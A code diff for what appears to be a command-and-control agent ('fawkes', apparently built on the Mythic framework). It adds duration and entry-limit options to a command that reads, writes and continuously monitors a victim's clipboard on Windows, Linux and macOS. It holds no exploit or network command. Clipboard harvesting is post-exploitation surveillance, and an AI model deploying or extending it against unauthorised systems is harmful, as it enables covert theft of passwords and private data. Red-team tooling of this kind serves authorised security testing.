@@ -11,7 +11,7 @@ func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "clipboard",
 		Description:         "Read, write, or continuously monitor clipboard contents (text only). Windows: native API, Linux: xclip/xsel/wl-paste, macOS: pbpaste/pbcopy.",
-		HelpString:          "clipboard -action read\nclipboard -action write -data \"text\"\nclipboard -action monitor [-interval 3]\nclipboard -action dump\nclipboard -action stop",
+		HelpString:          "clipboard -action read\nclipboard -action write -data \"text\"\nclipboard -action monitor [-interval 3] [-duration 300] [-max_items 100]\nclipboard -action dump\nclipboard -action stop",
 		Version:             2,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
@@ -64,6 +64,36 @@ func init() {
 						ParameterIsRequired: false,
 						GroupName:           "Default",
 						UIModalPosition:     2,
+					},
+				},
+			},
+			{
+				Name:             "duration",
+				ModalDisplayName: "Max Duration (seconds)",
+				CLIName:          "duration",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				Description:      "Maximum monitoring duration in seconds (default: 300, 0 = unlimited)",
+				DefaultValue:     300,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     3,
+					},
+				},
+			},
+			{
+				Name:             "max_items",
+				ModalDisplayName: "Max Entries",
+				CLIName:          "max_items",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				Description:      "Maximum clipboard entries to capture (default: 100, 0 = unlimited)",
+				DefaultValue:     100,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     4,
 					},
 				},
 			},
